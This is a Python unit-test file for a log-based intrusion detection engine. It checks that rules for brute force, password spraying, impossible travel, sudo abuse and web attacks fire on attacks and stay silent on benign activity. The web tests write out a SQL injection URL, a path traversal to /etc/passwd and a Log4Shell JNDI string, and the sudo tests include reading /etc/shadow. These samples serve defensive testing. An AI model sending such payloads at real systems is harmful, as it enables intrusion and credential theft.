"""Detection tests.

Every rule gets two tests: it fires on the attack it is written for, and it
stays silent on benign activity that superficially resembles it. The second
half is what separates a detection engine from a noise generator.
"""

from __future__ import annotations

import unittest

from helpers import event, rule_ids, web

from loghawk.detections import DetectionConfig, build_detections
from loghawk.detections.credential_attacks import (
    PasswordSpray,
    SSHBruteForce,
    SuccessAfterBruteForce,
    UserEnumeration,
)
from loghawk.detections.identity import ImpossibleTravel, OffHoursPrivilegedAccess
from loghawk.detections.privilege import PrivilegedAccountChange, SudoAbuse
from loghawk.detections.web import WebExploitAttempt, WebScanning
from loghawk.models import EventType, Severity

ATTACKER = "45.83.91.22"        # threat feed, Amsterdam
OFFICE = "39.41.2.9"            # Lahore
GERMANY = "185.220.101.44"      # threat feed, Frankfurt


class TestBruteForce(unittest.TestCase):
    def test_fires_on_rapid_failures_from_one_source(self):
        events = [
            event(EventType.AUTH_FAILURE, seconds=i * 3, user="root", ip=ATTACKER)
            for i in range(20)
        ]
        alerts = list(SSHBruteForce().run(events))
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].src_ip, ATTACKER)
        self.assertGreaterEqual(alerts[0].severity.rank, Severity.HIGH.rank)
        self.assertEqual(alerts[0].context["failed_attempts"], 20)

    def test_silent_on_a_user_mistyping_their_password(self):
        events = [
            event(EventType.AUTH_FAILURE, minutes=i * 2, user="sara", ip=OFFICE)
            for i in range(3)
        ]
        self.assertEqual(list(SSHBruteForce().run(events)), [])

    def test_slow_failures_spread_over_hours_do_not_fire(self):
        events = [
            event(EventType.AUTH_FAILURE, minutes=i * 30, user="root", ip=ATTACKER)
            for i in range(12)
        ]
        self.assertEqual(list(SSHBruteForce().run(events)), [])

    def test_one_burst_yields_one_alert_not_one_per_attempt(self):
        events = [
            event(EventType.AUTH_FAILURE, seconds=i, user="root", ip=ATTACKER)
            for i in range(60)
        ]
        self.assertEqual(len(list(SSHBruteForce().run(events))), 1)

    def test_threshold_is_configurable(self):
        events = [
            event(EventType.AUTH_FAILURE, seconds=i * 2, user="root", ip=ATTACKER)
            for i in range(5)
        ]
        self.assertEqual(list(SSHBruteForce().run(events)), [])
        loose = SSHBruteForce(DetectionConfig(brute_force_threshold=4))
        self.assertEqual(len(list(loose.run(events))), 1)


class TestPasswordSpray(unittest.TestCase):
    def test_fires_on_one_attempt_across_many_accounts(self):
        users = ["admin", "sara", "bilal", "jdoe", "svc_sql", "helpdesk", "guest"]
        events = [
            event(EventType.AUTH_FAILURE, seconds=i * 20, user=u, ip=GERMANY)
            for i, u in enumerate(users)
        ]
        alerts = list(PasswordSpray().run(events))
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].context["distinct_users"], len(users))

    def test_silent_when_the_same_account_is_hammered(self):
        events = [
            event(EventType.AUTH_FAILURE, seconds=i * 5, user="root", ip=ATTACKER)
            for i in range(20)
        ]
        self.assertEqual(list(PasswordSpray().run(events)), [])

    def test_brute_force_and_spray_do_not_both_claim_the_same_burst(self):
        users = ["a", "b", "c", "d", "e", "f", "g", "h"]
        events = [
            event(EventType.AUTH_FAILURE, seconds=i * 10, user=u, ip=GERMANY)
            for i, u in enumerate(users)
        ]
        fired = rule_ids(list(SSHBruteForce().run(events)) + list(PasswordSpray().run(events)))
        self.assertEqual(fired, {"LH-002"})


class TestUserEnumeration(unittest.TestCase):
    def test_fires_on_many_nonexistent_accounts(self):
        users = ["admin", "test", "oracle", "ubuntu", "jenkins", "git"]
        events = [
            event(EventType.INVALID_USER, seconds=i * 4, user=u, ip=ATTACKER)
            for i, u in enumerate(users)
        ]
        alerts = list(UserEnumeration().run(events))
        self.assertEqual(len(alerts), 1)
        self.assertEqual(len(alerts[0].context["invalid_users"]), len(users))

    def test_silent_on_a_single_typo(self):
        events = [event(EventType.INVALID_USER, user="saraa", ip=OFFICE)]
        self.assertEqual(list(UserEnumeration().run(events)), [])


class TestSuccessAfterBruteForce(unittest.TestCase):
    def test_fires_when_a_guess_lands(self):
        events = [
            event(EventType.AUTH_FAILURE, seconds=i * 3, user="deploy", ip=ATTACKER)
            for i in range(20)
        ]
        events.append(event(EventType.AUTH_SUCCESS, seconds=70, user="deploy", ip=ATTACKER))
        alerts = list(SuccessAfterBruteForce().run(events))
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].severity, Severity.CRITICAL)
        self.assertEqual(alerts[0].user, "deploy")

    def test_root_success_scores_at_the_ceiling(self):
        events = [
            event(EventType.AUTH_FAILURE, seconds=i * 3, user="root", ip=ATTACKER)
            for i in range(20)
        ]
        events.append(event(EventType.AUTH_SUCCESS, seconds=70, user="root", ip=ATTACKER))
        self.assertEqual(list(SuccessAfterBruteForce().run(events))[0].score, 100)

    def test_silent_when_the_success_long_predates_the_failures(self):
        events = [event(EventType.AUTH_SUCCESS, seconds=0, user="deploy", ip=ATTACKER)]
        events += [
            event(EventType.AUTH_FAILURE, minutes=30, seconds=i * 3, user="deploy", ip=ATTACKER)
            for i in range(20)
        ]
        self.assertEqual(list(SuccessAfterBruteForce().run(events)), [])

    def test_silent_on_a_clean_login(self):
        events = [event(EventType.AUTH_SUCCESS, user="sara", ip=OFFICE)]
        self.assertEqual(list(SuccessAfterBruteForce().run(events)), [])


class TestImpossibleTravel(unittest.TestCase):
    def test_fires_across_continents_within_minutes(self):
        events = [
            event(EventType.AUTH_SUCCESS, minutes=0, user="deploy", ip=ATTACKER),
            event(EventType.AUTH_SUCCESS, minutes=9, user="deploy", ip=OFFICE),
        ]
        alerts = list(ImpossibleTravel().run(events))
        self.assertEqual(len(alerts), 1)
        self.assertGreater(alerts[0].context["implied_kmh"], 900)
        self.assertEqual(alerts[0].context["from"]["country"], "NL")
        self.assertEqual(alerts[0].context["to"]["country"], "PK")

    def test_silent_when_the_gap_allows_a_real_flight(self):
        events = [
            event(EventType.AUTH_SUCCESS, hours=0, user="deploy", ip=ATTACKER),
            event(EventType.AUTH_SUCCESS, hours=12, user="deploy", ip=OFFICE),
        ]
        self.assertEqual(list(ImpossibleTravel().run(events)), [])

    def test_silent_for_two_different_users(self):
        events = [
            event(EventType.AUTH_SUCCESS, minutes=0, user="deploy", ip=ATTACKER),
            event(EventType.AUTH_SUCCESS, minutes=5, user="sara", ip=OFFICE),
        ]
        self.assertEqual(list(ImpossibleTravel().run(events)), [])

    def test_private_addresses_are_ignored(self):
        events = [
            event(EventType.AUTH_SUCCESS, minutes=0, user="deploy", ip="10.0.0.5"),
            event(EventType.AUTH_SUCCESS, minutes=2, user="deploy", ip=OFFICE),
        ]
        self.assertEqual(list(ImpossibleTravel().run(events)), [])


class TestOffHours(unittest.TestCase):
    def test_fires_for_root_at_02_00(self):
        events = [event(EventType.AUTH_SUCCESS, hours=-2, user="root", ip=GERMANY)]
        alerts = list(OffHoursPrivilegedAccess().run(events))
        self.assertEqual(len(alerts), 1)
        self.assertTrue(alerts[0].context["external"])

    def test_silent_for_a_normal_user_at_night(self):
        events = [event(EventType.AUTH_SUCCESS, hours=-2, user="sara", ip=OFFICE)]
        self.assertEqual(list(OffHoursPrivilegedAccess().run(events)), [])

    def test_silent_for_root_during_business_hours(self):
        events = [event(EventType.AUTH_SUCCESS, hours=6, user="root", ip=OFFICE)]
        self.assertEqual(list(OffHoursPrivilegedAccess().run(events)), [])


class TestSudoAbuse(unittest.TestCase):
    def test_fires_on_failed_sudo_and_shadow_access(self):
        events = [
            event(EventType.PRIV_ESCALATION_FAILED, minutes=1, user="deploy",
                  attempts=3, command="/usr/bin/cat /etc/shadow"),
            event(EventType.PRIV_ESCALATION, minutes=3, user="deploy",
                  target_user="root", command="/usr/bin/cat /etc/shadow"),
        ]
        alerts = list(SudoAbuse().run(events))
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].context["failed_sudo"], 1)
        self.assertTrue(alerts[0].context["sensitive_commands"])

    def test_fires_on_not_in_sudoers(self):
        events = [event(EventType.PRIV_ESCALATION_FAILED, user="guest",
                        reason="not_in_sudoers")]
        alerts = list(SudoAbuse().run(events))
        self.assertEqual(len(alerts), 1)
        self.assertTrue(alerts[0].context["not_in_sudoers"])

    def test_silent_on_routine_sudo(self):
        events = [
            event(EventType.PRIV_ESCALATION, user="abdullah", target_user="root",
                  command="/usr/bin/systemctl restart nginx"),
            event(EventType.PRIV_ESCALATION, minutes=1, user="abdullah",
                  target_user="root", command="/usr/bin/apt update"),
        ]
        self.assertEqual(list(SudoAbuse().run(events)), [])


class TestPrivilegedAccountChange(unittest.TestCase):
    def test_domain_admins_addition_is_critical(self):
        events = [event(EventType.GROUP_MEMBER_ADDED, user="svc_backup",
                        source="windows_security", target_group="Domain Admins",
                        event_id=4728)]
        alerts = list(PrivilegedAccountChange().run(events))
        self.assertEqual(alerts[0].severity, Severity.CRITICAL)
        self.assertTrue(alerts[0].context["privileged_group"])

    def test_ordinary_group_addition_is_lower(self):
        events = [event(EventType.GROUP_MEMBER_ADDED, user="jdoe",
                        source="windows_security", target_group="Marketing")]
        alerts = list(PrivilegedAccountChange().run(events))
        self.assertFalse(alerts[0].context["privileged_group"])
        self.assertLess(alerts[0].score, 65)

    def test_account_creation_is_reported(self):
        events = [event(EventType.ACCOUNT_CREATED, user="svc_backup",
                        source="windows_security", event_id=4720)]
        self.assertEqual(len(list(PrivilegedAccountChange().run(events))), 1)


class TestWebDetections(unittest.TestCase):
    def test_sql_injection_signature(self):
        events = [web("/api?id=1%20UNION%20SELECT%20pw%20FROM%20users",
                      ip=ATTACKER, status=500)]
        alerts = list(WebExploitAttempt().run(events))
        self.assertEqual(alerts[0].context["signature"], "sql_injection")
        self.assertTrue(alerts[0].context["reached_application"])

    def test_path_traversal_signature_after_url_decoding(self):
        events = [web("/dl?f=..%2F..%2Fetc%2Fpasswd", ip=ATTACKER, status=200)]
        alerts = list(WebExploitAttempt().run(events))
        self.assertEqual(alerts[0].context["signature"], "path_traversal")

    def test_log4shell_in_user_agent(self):
        events = [web("/", ip=GERMANY, status=200, agent="${jndi:ldap://x/a}")]
        alerts = list(WebExploitAttempt().run(events))
        self.assertEqual(alerts[0].context["signature"], "log4shell")

    def test_silent_on_normal_browsing(self):
        events = [web(p, ip=OFFICE, status=200, seconds=i * 20)
                  for i, p in enumerate(["/", "/complaints", "/static/app.js", "/api/v1/me"])]
        self.assertEqual(list(WebExploitAttempt().run(events)), [])
        self.assertEqual(list(WebScanning().run(events)), [])

    def test_scanner_user_agent_is_enough_to_fire(self):
        events = [web("/", ip=ATTACKER, status=200, agent="Nikto/2.5.0")]
        self.assertEqual(len(list(WebScanning().run(events))), 1)

    def test_burst_of_404s_fires(self):
        events = [web(f"/admin{i}", ip=ATTACKER, status=404, seconds=i * 5)
                  for i in range(10)]
        alerts = list(WebScanning().run(events))
        self.assertEqual(len(alerts), 1)
        self.assertGreaterEqual(alerts[0].context["error_responses"], 10)

    def test_one_genuine_404_does_not_fire(self):
        events = [web("/favicon.ico", ip=OFFICE, status=404)]
        self.assertEqual(list(WebScanning().run(events)), [])


class TestRuleSelection(unittest.TestCase):
    def test_build_detections_honours_enable_and_disable(self):
        self.assertEqual(len(build_detections()), 10)
        only = build_detections(enabled=["LH-004"])
        self.assertEqual([r.rule_id for r in only], ["LH-004"])
        without = build_detections(disabled=["LH-001", "LH-002"])
        self.assertNotIn("LH-001", [r.rule_id for r in without])
        self.assertEqual(len(without), 8)


if __name__ == "__main__":
    unittest.main(verbosity=2)
